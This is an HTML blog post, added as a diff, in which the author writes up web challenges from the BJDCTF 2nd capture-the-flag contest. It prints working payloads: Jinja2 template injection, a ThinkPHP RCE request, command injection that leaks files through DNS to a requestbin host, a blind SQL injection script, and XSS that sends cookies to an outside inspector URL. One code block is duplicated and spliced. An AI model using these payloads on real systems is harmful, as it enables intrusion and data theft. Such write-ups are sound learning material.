@@ -1,0 +1,1484 @@
+
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next pisces" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。">
+<meta name="keywords" content="Jekyll, NexT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bjdctf 2nd Web">
+<meta property="og:url" content="http://localhost:4000/2020/03/23/BJDCTF-2nd-Web/">
+<meta property="og:site_name" content="Glyuan's Blog">
+<meta property="og:description" content="上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://glyuan419.github.io/uploads/posts/2020-03-23-BJDCTF-2nd-Web/hackbar.png">
+<meta property="og:image" content="https://glyuan419.github.io/uploads/posts/2020-03-23-BJDCTF-2nd-Web/mendeleev.jpg">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bjdctf 2nd Web">
+<meta name="twitter:description" content="上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。">
+<meta name="twitter:image" content="https://glyuan419.github.io/uploads/posts/2020-03-23-BJDCTF-2nd-Web/hackbar.png">
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":true,"scrollpercent":true},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://localhost:4000/"/>
+
+
+
+
+
+  <title>Bjdctf 2nd Web | Glyuan's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Glyuan's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+<div id="posts" class="posts-expand">
+  
+  
+
+  
+
+  
+  
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/2020/03/23/BJDCTF-2nd-Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asinose">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glyuan's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+          
+          
+            Bjdctf 2nd Web
+          
+        </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-23T00:00:00+08:00">
+                2020-03-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+            
+                <div class="post-description">
+                    
+                </div>
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <p>上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。</p>
+
+<!-- more -->
+
+<h1 id="fake-google">fake google</h1>
+
+<h2 id="题目描述">题目描述</h2>
+
+<p>题目用了谷歌搜索的前端页面，随便输入点东西，返回：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>P3's girlfirend is : foo
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>原样返回了，再看看源码：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="c">&lt;!--ssssssti &amp; a little trick --&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="解题思路">解题思路</h2>
+
+<p>都这么明显了，直接SSTI，先检测一下什么模板：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>{{7*'7'}} =&gt; 7777777
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>是Jinja2。然后试了一下，发现”{%%}”标签和好多函数都不能用，最后importi了os，读取了flag，Payload：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>{{''.__class__.__mro__[1].__subclasses__()[64].__init__.__globals__['__import__']('os').popen('base64 &lt; /flag').read()}}
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="备注">备注</h2>
+
+<ol>
+  <li>
+    <p>说实话并不知道为什么那些函数不能用了，回头看看出题笔记。</p>
+  </li>
+  <li>
+    <p>好像也做过好几个SSTI了，当然只是是非常基础的类型，但每次都是找博客，直接抄抄改改人家的Payload。接下来好好整理总结一下SSTI。</p>
+  </li>
+  <li>
+    <p>Payload找可用函数的时候因为”{%%}”标签不能用，是手动二分出来的，其实可以用Python搞。</p>
+  </li>
+  <li>
+    <p>还不是很理解Python的类什么的，回炉重造一波。</p>
+  </li>
+  <li>
+    <p>贴一个官方的Payload：</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code> ?name={{ config.class.init.globals['os'].popen('ls /').read() }}
+</code></pre></td></tr></tbody></table></div>    </div>
+  </li>
+</ol>
+
+<hr />
+
+<h1 id="old-hack">old-hack</h1>
+
+<h2 id="题目描述-1">题目描述</h2>
+
+<p>是个黑页，目录扫了一遍没什么信息，不过注意到用了ThinkPHP5。</p>
+
+<h2 id="解题思路-1">解题思路</h2>
+
+<p>ThinkPHP5漏洞多多，查看Debug界面，版本为5.0.23，又一个RCE漏洞，百度了Payload：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2</pre></td><td class="code"><pre class="highlight"><code>?s=captcha
+POST：_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="备注-1">备注</h2>
+
+<ol>
+  <li>并没有了解过ThinkPHP的一系列漏洞，打算抽空学习一下。</li>
+  <li>然后也没有学习过ThinkPHP的基本用法，Payload也用得云里雾里，下次必学。</li>
+</ol>
+
+<hr />
+
+<h1 id="dungshell">dungShell</h1>
+
+<h2 id="题目描述-2">题目描述</h2>
+
+<p>提示写到脸上了，有.swp文件。</p>
+
+<h2 id="解题思路-2">解题思路</h2>
+
+<p>源码删减：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"how can i give you source code? .swp?!"</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'girl_friend'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"where is P3rh4ps's girl friend ???"</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$girl</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'girl_friend'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/<pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"how can i give you source code? .swp?!"</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'girl_friend'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"where is P3rh4ps's girl friend ???"</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$girl</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'girl_friend'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\&gt;|\\\/'</span><span class="p">,</span> <span class="nv">$girl</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'just girl'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="p">,</span> <span class="nv">$girl</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">//duangShell~~~~
+</span>        <span class="nb">exec</span><span class="p">(</span><span class="nv">$girl</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre>gt;|\\/'</span><span class="p">,</span> <span class="nv">$girl</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'just girl'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="p">,</span> <span class="nv">$girl</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">//duangShell~~~~
+</span>        <span class="nb">exec</span><span class="p">(</span><span class="nv">$girl</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>拦截形同虚设，可以用”php -r”执行PHP代码。不过没有回显，需要将结果打到DNS上。</p>
+
+<p>扫根目录：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：girl_friend=php -r "system('ping '.substr(implode('.',scandir('/')),6,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>读/flag：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /flag'),0,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>分两次读，解码后：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>flag{flag-is-not-here,please-find-it-by-yourself}
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>不太对劲，要找真正的flag，在.bash_history里面看到了信息，然后再读：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh4ps/love/flag'),0,50).'.46418d29ca743ab417af.d.dns.requestbin.buuoj.cn');"
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="备注-2">备注</h2>
+
+<ol>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx</td>
+          <td>bash弹Shell，然后find一下flag。</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <p>因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下${foo}。至于”$”符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3</pre></td><td class="code"><pre class="highlight"><code> POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"
+    
+ YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&gt; a=$(find / -name flag);echo ${a:10:15}|base64
+</code></pre></td></tr></tbody></table></div>    </div>
+  </li>
+  <li>不得不说，上面这个方法太蛋疼了，得整一个VPS工具。</li>
+</ol>
+
+<hr />
+
+<h1 id="简单注入">简单注入</h1>
+
+<h2 id="题目描述-3">题目描述</h2>
+
+<p>上来就是个登录框，注入写到了脸上。</p>
+
+<h2 id="解题思路-3">解题思路</h2>
+
+<p>先看看请求头等其它地方又没有什么信息，无果，那就老老实实注入吧。Fuzz一下，单双引号、select、union都被拦截了。一步一步来。</p>
+
+<p>首先这肯定是个字符型注入，引号又被过滤，只能想着对原有的引号下手，宽字节试了一下没什么用，不过”\“起作用了，Payload：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：password=or 2&gt;1#&amp;username=\
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>返回里有句话变了：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>BJD needs to be stronger
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>失败了？但是修改Payload中的布尔值之后的返回和其它错误密码的结果一样：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>You konw ,P3rh4ps needs a girl friend
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>这说明刚刚的注入确实成功了，应该是在PHP中将我们的输入和Mysql返回的密码又做了一次对比，那就盲注一下密码，Payload：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>POST：password=or password regexp ^0x#&amp;username=\
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>Python跑了结果是：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>ohyoufoundit
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>然后登录，失败了，还是没有通过在PHP中的验证，但在Mysql中确确实实是通过了，很疑惑。</p>
+
+<p>看了官方WP，原来是大小写的问题，所以虽然Mysql通过了，但在PHP中被大小写拦住了，出题人的脚本：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27</pre></td><td class="code"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="c"># P3rh4ps tql!!!</span>
+<span class="n">url</span><span class="o">=</span><span class="s">'http://39.106.207.66:2333/'</span>
+<span class="k">def</span> <span class="nf">str2hex</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="n">c</span><span class="o">=</span><span class="s">'0x'</span>
+    <span class="n">a</span><span class="o">=</span><span class="s">''</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
+        <span class="n">a</span><span class="o">+=</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">c</span><span class="o">+</span><span class="n">a</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+<span class="n">alphabet</span> <span class="o">=</span> <span class="p">[</span><span class="s">'!'</span><span class="p">,</span><span class="s">'['</span><span class="p">,</span><span class="s">']'</span><span class="p">,</span><span class="s">'{'</span><span class="p">,</span><span class="s">'}'</span><span class="p">,</span><span class="s">'_'</span><span class="p">,</span><span class="s">'/'</span><span class="p">,</span><span class="s">'-'</span><span class="p">,</span><span class="s">'&amp;'</span><span class="p">,</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="p">,</span><span class="s">'#'</span><span class="p">,</span><span class="s">'@'</span><span class="p">,</span><span class="s">'a'</span><span class="p">,</span><span class="s">'b'</span><span class="p">,</span><span class="s">'c'</span><span class="p">,</span><span class="s">'d'</span><span class="p">,</span><span class="s">'e'</span><span class="p">,</span><span class="s">'f'</span><span class="p">,</span><span class="s">'g'</span><span class="p">,</span><span class="s">'h'</span><span class="p">,</span><span class="s">'i'</span><span class="p">,</span><span class="s">'g'</span><span class="p">,</span><span class="s">'k'</span><span class="p">,</span><span class="s">'l'</span><span class="p">,</span><span class="s">'m'</span><span class="p">,</span><span class="s">'n'</span><span class="p">,</span><span class="s">'o'</span><span class="p">,</span><span class="s">'p'</span><span class="p">,</span><span class="s">'q'</span><span class="p">,</span><span class="s">'r'</span><span class="p">,</span><span class="s">'s'</span><span class="p">,</span><span class="s">'t'</span><span class="p">,</span><span class="s">'u'</span><span class="p">,</span><span class="s">'v'</span><span class="p">,</span><span class="s">'w'</span><span class="p">,</span><span class="s">'x'</span><span class="p">,</span><span class="s">'y'</span><span class="p">,</span><span class="s">'z'</span><span class="p">,</span><span class="s">'A'</span><span class="p">,</span><span class="s">'B'</span><span class="p">,</span><span class="s">'C'</span><span class="p">,</span><span class="s">'D'</span><span class="p">,</span><span class="s">'E'</span><span class="p">,</span><span class="s">'F'</span><span class="p">,</span><span class="s">'G'</span><span class="p">,</span><span class="s">'H'</span><span class="p">,</span><span class="s">'I'</span><span class="p">,</span><span class="s">'G'</span><span class="p">,</span><span class="s">'K'</span><span class="p">,</span><span class="s">'L'</span><span class="p">,</span><span class="s">'M'</span><span class="p">,</span><span class="s">'N'</span><span class="p">,</span><span class="s">'O'</span><span class="p">,</span><span class="s">'P'</span><span class="p">,</span><span class="s">'Q'</span><span class="p">,</span><span class="s">'R'</span><span class="p">,</span><span class="s">'S'</span><span class="p">,</span><span class="s">'T'</span><span class="p">,</span><span class="s">'U'</span><span class="p">,</span><span class="s">'V'</span><span class="p">,</span><span class="s">'W'</span><span class="p">,</span><span class="s">'X'</span><span class="p">,</span><span class="s">'Y'</span><span class="p">,</span><span class="s">'Z'</span><span class="p">,</span><span class="s">'0'</span><span class="p">,</span><span class="s">'1'</span><span class="p">,</span><span class="s">'2'</span><span class="p">,</span><span class="s">'3'</span><span class="p">,</span><span class="s">'4'</span><span class="p">,</span><span class="s">'5'</span><span class="p">,</span><span class="s">'6'</span><span class="p">,</span><span class="s">'7'</span><span class="p">,</span><span class="s">'8'</span><span class="p">,</span><span class="s">'9'</span><span class="p">]</span>
+
+
+<span class="n">flag</span><span class="o">=</span><span class="s">'^'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
+        <span class="n">tmp</span><span class="o">=</span><span class="n">flag</span><span class="o">+</span><span class="n">y</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">"username"</span><span class="p">:</span> <span class="s">"P3rh4ps</span><span class="se">\</span><span class="s">"</span><span class="p">,</span>
+            <span class="s">"password"</span><span class="p">:</span> <span class="s">"||password regexp binary {}#"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">str2hex</span><span class="p">(</span><span class="n">tmp</span><span class="p">))</span>
+        <span class="p">}</span>
+   <span class="c">#     print(data['password'])</span>
+        <span class="n">x</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s">'BJD needs'</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="c">#    print(x.post(url,data=data).text)</span>
+            <span class="n">flag</span><span class="o">=</span><span class="n">tmp</span>
+            <span class="k">break</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"^"</span><span class="p">,</span><span class="s">""</span><span class="p">))</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>爆出密码后登录获得flag。</p>
+
+<h2 id="备注-3">备注</h2>
+
+<ol>
+  <li>Fuzz很重要，要先fuzz。</li>
+  <li>Mysql的字段内容在查询的时候是忽略大小写的，但其实在实际的编码存储中还是有区别的。</li>
+  <li>REGEXP匹配是大小写不敏感的，为区分大小写可以加上BINARY关键字。</li>
+</ol>
+
+<hr />
+
+<h1 id="假猪套天下第一">假猪套天下第一</h1>
+
+<h2 id="题目描述-4">题目描述</h2>
+
+<p>上来是个登录框，随便试试，居然成功了，返回的界面很炫酷，但是没什么信息。</p>
+
+<h2 id="解题思路-4">解题思路</h2>
+
+<p>在返回的页面的源码中找到一个叫”L0g1n.php”的文件，访问一波。返回如下内容：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>Sorry, this site will be available after totally 99 years!
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>然后可以看到Cookie中有个时间戳，接着就卡住了，因为受Schrodin那题的影响，一直以为是要把时间改早，然后一直没过，其实是要往后改，有新返回：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>Sorry, this site is only optimized for those who comes from localhost
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>改IP，这里X-Forward-For不能用要用Clint-IP或者X-Real-IP，提交。然后就是好几次类似地改请求头，最后在返回的源码里面找到flag。</p>
+
+<p>其中有一步需要改User-Agent，给的提示是Commodo 64，但实际上型号是Commodore 64，百度直接搜索不到这个结果，不过Google可以。</p>
+
+<p>所有Headers如下：</p>
+
+<p><img src="https://glyuan419.github.io/uploads/posts/2020-03-23-BJDCTF-2nd-Web/hackbar.png" alt="hackbar" /></p>
+
+<h2 id="备注-4">备注</h2>
+
+<ol>
+  <li>还是思维僵化的问题。</li>
+  <li>对于Headers的了解也不太够。</li>
+</ol>
+
+<hr />
+
+<h1 id="xss之光">xss之光</h1>
+
+<h2 id="题目描述-5">题目描述</h2>
+
+<p>页面只有九个字符，”gungungun”，抓包看了下也没有任何信息。</p>
+
+<h2 id="解题思路-5">解题思路</h2>
+
+<p>那就扫目录呗，有git泄漏，提取一下：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'yds_is_so_beautiful'</span><span class="p">]);</span>
+<span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>  
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>有点谜，只有一个反序列化，但是没有魔术方法。应该不是反序列化漏洞，注意到反序列化之后会echo出来，可能会和XSS有关。试着alert一下，成功了，但是没有给Cookie。</p>
+
+<p>然后看了提示，要把Cookie打出去，可能要读Cookie？试一试：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="nb">serialize</span><span class="p">(</span><span class="s2">"&lt;script&gt;document.body.appendChild(document.createElement('img')).setAttribute('src','https://requestinspector.com/inspect/01e40wkvsk52d6dzx2axgggmqm?c='+document.cookie);&lt;/script&gt;"</span><span class="p">)</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>然后在Cookie里面找到了发回来的flag，有点迷。</p>
+
+<h2 id="备注-5">备注</h2>
+
+<ol>
